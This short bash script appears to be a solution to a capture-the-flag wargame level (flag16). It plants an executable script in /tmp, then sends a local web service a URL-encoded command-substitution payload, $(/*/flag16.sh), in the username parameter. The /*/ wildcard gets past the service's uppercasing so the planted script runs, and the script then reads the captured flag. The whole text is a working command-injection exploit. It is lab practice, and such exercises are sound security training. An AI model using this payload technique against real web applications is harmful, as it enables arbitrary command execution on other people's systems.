#!/usr/bin/env bash

cat >/tmp/FLAG16.SH <<EOF
#!/usr/bin/env bash
getflag >/tmp/flag16
EOF
chmod ugo=rwx /tmp/FLAG16.SH

getflag="%24%28%2f%2a%2fflag16.sh%29"
port="$(ss -ant | awk '/LISTEN.+:160/ {print $4}')"
curl -s "http://127.0.0.1:${port##*:}?username=$getflag"

cat /tmp/flag16
rm -f /tmp/FLAG16.SH /tmp/flag16
